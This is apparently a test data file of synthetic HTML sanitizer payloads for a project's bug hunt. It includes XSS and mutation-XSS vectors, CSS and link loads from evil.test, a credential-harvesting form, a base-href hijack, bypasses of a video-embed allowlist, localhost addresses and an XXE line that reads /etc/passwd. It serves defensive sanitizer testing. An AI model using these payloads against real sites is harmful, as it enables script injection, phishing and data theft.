@@ -1,0 +1,250 @@
+# Original sanitizer payloads for the 1.1 bug hunt. One per line; a leading double quote means a Go string literal.
+# Synthetic: written for Kipple, not copied from any list. Hosts are example/test names.
+# --- script and handler vectors
+<scr<script>ipt>alert(1)</scr</script>ipt>
+<img src=1 onerror="&#97;lert(1)">
+<img/src=x/onerror=alert(1)>
+<img src=x onerror
+<body onload=alert(1)>
+<details open ontoggle=alert(1)>
+<input autofocus onfocus=alert(1)>
+<video><source onerror=alert(1)></video>
+<marquee onstart=alert(1)>x</marquee>
+<a href=# onclick=alert(1)>x</a>
+<a href="jav&#x0A;ascript:alert(1)">x</a>
+<a href="&#106;avascript:alert(1)">x</a>
+<a href="java&Tab;script:alert(1)">x</a>
+<a href="vbscript:msgbox(1)">x</a>
+<a href="JAVASCRIPT&colon;alert(1)">x</a>
+"<a href=\"\x01javascript:alert(1)\">x</a>"
+"<a href=\"java\x00script:alert(1)\">x</a>"
+<a href=" data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>
+<a href="blob:https://example.test/00000000-0000-0000-0000-000000000000">x</a>
+<a href="filesystem:https://example.test/temporary/x">x</a>
+<a href="about:blank">x</a>
+<a href="//example.test/x" target=_blank>x</a>
+<a href="https://example.test/" target=_blank rel="">x</a>
+# --- data and blob URLs in resource attributes
+<img src="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' onload='alert(1)'/>">
+<img src="data:text/html,<script>alert(1)</script>">
+<img src="data:image/png;base64,AAAA">
+<img src="blob:https://example.test/abc">
+<iframe src="data:text/html,<script>alert(1)</script>"></iframe>
+<iframe srcdoc="<script>alert(1)</script>"></iframe>
+<object data="data:text/html,<script>alert(1)</script>"></object>
+<embed src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+">
+<video poster="javascript:alert(1)"><source src="javascript:alert(1)"></video>
+<audio src="data:audio/wav;base64,AAAA" controls></audio>
+<link rel=stylesheet href="data:text/css,*{background:url(javascript:alert(1))}">
+# --- srcset and picture
+<img srcset="https://example.test/a.png 1x, javascript:alert(1) 2x">
+<img srcset="data:image/png;base64,AAAA 1x, https://example.test/b.png 2x">
+<img srcset="a.png 1x,,, b.png 2x, , c.png">
+<img srcset="https://example.test/a.png 1000000000000x">
+<img srcset="https://example.test/a.png -1w, https://example.test/b.png NaNw">
+<img srcset="x" sizes="(max-width:600px) 100vw, calc(100vw - 2em)">
+<img srcset="https://example.test/a,b.png 1x, https://example.test/c.png 2x">
+<picture><source srcset="javascript:alert(1)" media="(min-width:1px)"><img src="https://example.test/p.png"></picture>
+<picture><source srcset="https://example.test/p.webp" type="image/webp"><source srcset="//evil.test/p.png"><img src=x onerror=alert(1)></picture>
+<picture><img></picture>
+<img src="https://example.test/p.png" loading=lazy decoding=async fetchpriority=high referrerpolicy=unsafe-url>
+# --- SVG
+<svg><script>alert(1)</script></svg>
+<svg><a xlink:href="javascript:alert(1)"><text>x</text></a></svg>
+<svg><a href="javascript:alert(1)"><text>x</text></a></svg>
+<svg><animate attributeName=href values=javascript:alert(1) /><a id=a><text>x</text></a></svg>
+<svg><set attributeName=onmouseover to=alert(1) /></svg>
+<svg><use href="data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg'><script>alert(1)</script></svg>#x"/></svg>
+<svg><foreignObject><iframe srcdoc="<script>alert(1)</script>"></iframe></foreignObject></svg>
+<svg><style>@import url(//evil.test/x.css);</style></svg>
+<svg><image href="javascript:alert(1)"/></svg>
+<svg><title><style><img src=x onerror=alert(1)></style></title></svg>
+<svg></p><style><a id="</style><img src=x onerror=alert(1)>">
+<svg><desc><![CDATA[</desc><script>alert(1)</script>]]></svg>
+<svg width=1 height=1 viewBox="0 0 1 1"><circle r=1 /></svg>
+# --- MathML and mutation (mXSS) shapes
+<math><mi xlink:href="javascript:alert(1)">x</mi></math>
+<math href="javascript:alert(1)">x</math>
+<math><annotation-xml encoding="text/html"><script>alert(1)</script></annotation-xml></math>
+<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;img src=1 onerror=alert(1)&gt;">
+<math><mtext><mglyph><svg><mtext><style><path id="</style><img onerror=alert(1) src>">
+<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>
+<table><td><style><img src=x onerror=alert(1)></style></td></table>
+<noscript><style></noscript><img src=x onerror=alert(1)></style>
+<noembed><img src=x onerror=alert(1)></noembed>
+<noframes><p title="</noframes><img src=x onerror=alert(1)>">
+<xmp><img src=x onerror=alert(1)></xmp>
+<plaintext><img src=x onerror=alert(1)>
+<textarea><img src=x onerror=alert(1)></textarea>
+<title><img src=x onerror=alert(1)></title>
+<template><img src=x onerror=alert(1)></template>
+<select><template><style></select><img src=x onerror=alert(1)></style></template></select>
+<p><b><p></b><img src=x onerror=alert(1)>
+<a><table><a></table><p><a><div><a>
+<b><i></b></i><b><i></b></i>
+<div><p></div></p><p></p>
+<!--><img src=x onerror=alert(1)>-->
+<!--><script>alert(1)</script>
+<!---><script>alert(1)</script>-->
+<!-- a --!><img src=x onerror=alert(1)> -->
+<![CDATA[<img src=x onerror=alert(1)>]]>
+<?xml version="1.0"?><img src=x onerror=alert(1)>
+<% alert(1) %>
+</title><script>alert(1)</script>
+<p title="</p><script>alert(1)</script>">x</p>
+<p id="x" name="x" class="x"><a name=x href=#x>x</a></p>
+<img name=createElement src=x>
+<form id=x><input name=attributes></form>
+# --- CSS and style
+<div style="background:url('javascript:alert(1)')">x</div>
+<div style="background:url(&quot;javascript:alert(1)&quot;)">x</div>
+<div style="width:expression(alert(1))">x</div>
+<div style="behavior:url(x.htc)">x</div>
+<div style="-moz-binding:url(//evil.test/x.xml#x)">x</div>
+<div style="background:\75rl(javascript:alert(1))">x</div>
+<div style="background:u\72l(//evil.test/x)">x</div>
+<div style="position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:2147483647">overlay</div>
+<div style="color:red;/*;x:url(//evil.test/x)*/">x</div>
+<div style="background-image:image-set('//evil.test/x.png' 1x)">x</div>
+<p style="font-family:'a';}</style><script>alert(1)</script>">x</p>
+<style>*{background:url(//evil.test/track.gif)}</style>
+<style>@import "//evil.test/x.css";</style>
+<style>@font-face{src:url(//evil.test/x.woff)}</style>
+<style>a{content:"</style><script>alert(1)</script>"}</style>
+<link rel=stylesheet href="//evil.test/x.css">
+<link rel=preload as=script href="//evil.test/x.js">
+<link rel=prefetch href="//evil.test/x">
+# --- meta, base, refresh, forms
+<meta http-equiv="refresh" content="0;url=javascript:alert(1)">
+<meta http-equiv="refresh" content="0; url=https://evil.test/">
+<meta http-equiv="set-cookie" content="a=b">
+<meta http-equiv="Content-Security-Policy" content="default-src *">
+<meta charset="utf-7">+ADw-script+AD4-alert(1)+ADw-/script+AD4-
+<meta name="viewport" content="width=device-width">
+<base href="https://evil.test/"><a href="x">x</a><img src="y.png">
+<base target="_blank"><a href="x">x</a>
+<form action="https://evil.test/"><input name=p type=password><button>go</button></form>
+<form><button formaction="javascript:alert(1)">x</button></form>
+<button popovertarget=x>x</button><div popover id=x>x</div>
+<input type=image src="javascript:alert(1)">
+<isindex action="javascript:alert(1)" type=submit>
+<keygen autofocus onfocus=alert(1)>
+<dialog open onclose=alert(1)><form method=dialog><button>x</button></form></dialog>
+# --- iframes, nesting and embeds
+<iframe src="javascript:alert(1)"></iframe>
+<iframe src="https://example.test/"><iframe src="https://example.test/"><iframe src="https://example.test/"></iframe></iframe></iframe>
+<iframe><iframe><iframe><iframe><iframe><iframe><iframe><iframe></iframe></iframe></iframe></iframe></iframe></iframe></iframe></iframe>
+<iframe src="https://example.test/" sandbox="allow-scripts allow-same-origin"></iframe>
+<iframe src="https://example.test/" allow="camera *; microphone *" allowfullscreen></iframe>
+<iframe srcdoc="&lt;iframe srcdoc=&quot;&amp;lt;script&amp;gt;alert(1)&amp;lt;/script&amp;gt;&quot;&gt;"></iframe>
+<frameset><frame src="javascript:alert(1)"></frameset>
+<frameset onload=alert(1)>
+<object type="text/html" data="https://example.test/"></object>
+<applet code="x"></applet>
+<embed src="https://example.test/x.swf" type="application/x-shockwave-flash" allowscriptaccess=always>
+# --- embed allowlist bypass hosts (video embeds only from approved hosts)
+<iframe src="https://www.youtube.com.evil.test/embed/dQw4w9WgXcQ"></iframe>
+<iframe src="https://evil.test/www.youtube.com/embed/dQw4w9WgXcQ"></iframe>
+<iframe src="https://www.youtube.com@evil.test/embed/dQw4w9WgXcQ"></iframe>
+<iframe src="https://evil.test#www.youtube.com/embed/dQw4w9WgXcQ"></iframe>
+<iframe src="https://evil.test?www.youtube.com/embed/x"></iframe>
+<iframe src="https://evil.test\@www.youtube.com/embed/x"></iframe>
+<iframe src="//www.youtube.com/embed/x"></iframe>
+<iframe src="http://www.youtube.com/embed/x"></iframe>
+<iframe src="https://WWW.YOUTUBE.COM/embed/x"></iframe>
+<iframe src="https://www.youtube.com./embed/x"></iframe>
+<iframe src="https://www.youtube.com:444/embed/x"></iframe>
+<iframe src="https://www.youtube.com:@evil.test/embed/x"></iframe>
+<iframe src="https://xn--youtube-n2a.example/embed/x"></iframe>
+<iframe src="https://www.youtube-nocookie.com/embed/x?autoplay=1&origin=https://evil.test"></iframe>
+<iframe src="https://www.youtube.com/embed/../../redirect?q=https://evil.test"></iframe>
+<iframe src="https://www.youtube.com/embed/%2e%2e/redirect"></iframe>
+<iframe src="https://www.youtube.com/redirect?q=https%3A%2F%2Fevil.test"></iframe>
+<iframe src="https://player.vimeo.com.evil.test/video/1"></iframe>
+<iframe src="https://player.vimeo.com/video/1?dnt=1"></iframe>
+<iframe src="https://evil.test/player.vimeo.com/video/1"></iframe>
+<iframe src="https://127.0.0.1/embed/x"></iframe>
+<iframe src="https://[::1]/embed/x"></iframe>
+<iframe src="https://2130706433/embed/x"></iframe>
+<iframe src="https://0x7f.1/embed/x"></iframe>
+<iframe src="https://localhost/embed/x"></iframe>
+<iframe src="https://1.2.3.4.nip.io/embed/x"></iframe>
+<iframe src="ftp://www.youtube.com/embed/x"></iframe>
+<iframe src=" https://www.youtube.com/embed/x"></iframe>
+<iframe src="https://www.youtube.com/embed/x" srcdoc="<script>alert(1)</script>"></iframe>
+<iframe src="https://www.youtube.com/embed/x" onload=alert(1)></iframe>
+<iframe src="https://www.youtube.com/embed/x" sandbox></iframe>
+<iframe width="99999" height="-1" src="https://www.youtube.com/embed/x"></iframe>
+<embed src="https://www.youtube.com/v/x">
+<object data="https://www.youtube.com/v/x"></object>
+<video src="https://evil.test/x.mp4" autoplay muted loop></video>
+# --- tracking and URL oddities in links and images
+<a href="https://example.test/p?utm_source=a&utm_medium=b&fbclid=c&gclid=d&id=1#frag">x</a>
+<a href="https://example.test/p?utm_source=a&utm_source=b&UTM_CAMPAIGN=C">x</a>
+<a href="https://example.test/p?&&&=&=&a">x</a>
+<a href="https://example.test/p?utm_source">x</a>
+<a href="https://user:pass@example.test/">x</a>
+<a href="https://example.test:99999/">x</a>
+<a href="https://[::1/">x</a>
+<a href="https://exa mple.test/">x</a>
+<a href="https://example.test/%00%0d%0a">x</a>
+<a href="https://example.test/ä?ö=ü#ß">x</a>
+<a href="HTTPS://EXAMPLE.TEST/A">x</a>
+<a href=" https://example.test/ ">x</a>
+<a href="mailto:a@example.test?subject=x">x</a>
+<a href="tel:+15555550100">x</a>
+<a href="sms:+15555550100">x</a>
+<a href="#">x</a>
+<a href="">x</a>
+<a>no href</a>
+<img src="">
+<img src="https://example.test/p.png" width="99999999999999999999" height="-5">
+<img src="https://example.test/1x1.gif" width=1 height=1>
+<img src="https://example.test/p.png" width="0" height="0" style="display:none">
+<img src="//example.test/p.png">
+<img src="/relative/p.png">
+<img src="../../p.png">
+<img data-src="https://example.test/lazy.png" src="data:image/gif;base64,R0lGODlhAQABAAAAACw=">
+<img src="https://example.test/p.png" alt="a&quot;b'c<d>e">
+# --- weird structure and sizes
+<p>
+"<p>\x00\x01\x02</p>"
+"<p>﻿​‎‮&#x202e;rtl</p>"
+"<p>café é \U0001F600</p>"
+<p>&#0;&#x0;&#xD800;&#x110000;&#99999999999;&amp;amp;&lt;script&gt;</p>
+<p>&notit; &copy &amp &lt &gt</p>
+<p title=&quot>x</p>
+<DiV oNcLiCk=alert(1)>x</DiV>
+<div<div>x</div>
+<div =x>x</div>
+<div x=">x</div>
+<<script>script>alert(1)<</script>/script>
+<a href=x href=javascript:alert(1)>x</a>
+<img src=x src=y onerror=alert(1) onerror=alert(2)>
+<ul><li><ul><li><ul><li><ul><li><ul><li><ul><li><ul><li><ul><li>deep
+<table><tr><td><table><tr><td><table><tr><td><table><tr><td>deep
+<blockquote><blockquote><blockquote><blockquote><blockquote><blockquote>deep
+<span><span><span><span><span><span><span><span><span><span><span><span>deep
+<h1><h2><h3><h4><h5><h6>x
+<font color=red><center><big><tt><strike><u>x
+<br/><br><br />
+<hr><hr/>
+<p><![if IE]>x<![endif]></p>
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd"><p>x</p>
+<!DOCTYPE html [<!ENTITY x SYSTEM "file:///etc/passwd">]><p>&x;</p>
+<html><head><script>alert(1)</script></head><body><p>x</p></body></html>
+<body background="javascript:alert(1)">
+<table background="javascript:alert(1)"><tr><td background="javascript:alert(1)">x</td></tr></table>
+<bgsound src="javascript:alert(1)">
+<layer src="https://evil.test/x"></layer>
+<xss style="behavior:url(x)">x</xss>
+<custom-element onclick=alert(1)>x</custom-element>
+<x-y:z href="javascript:alert(1)">x</x-y:z>
+<a href="x" ping="https://evil.test/ping">x</a>
+<a href="x" download="x.exe">x</a>
+<a href="x" referrerpolicy="unsafe-url">x</a>
+<div hidden>hidden</div><div aria-hidden=true>aria</div>
+<p contenteditable onfocus=alert(1) tabindex=0>x</p>
+<p is="x-evil">x</p>
+<p slot=x>x</p><slot name=x></slot>
+<p data-x="1" data-y='2' aria-label="l" role="button" class="c" id="i" lang="en" dir="rtl" title="t">x</p>
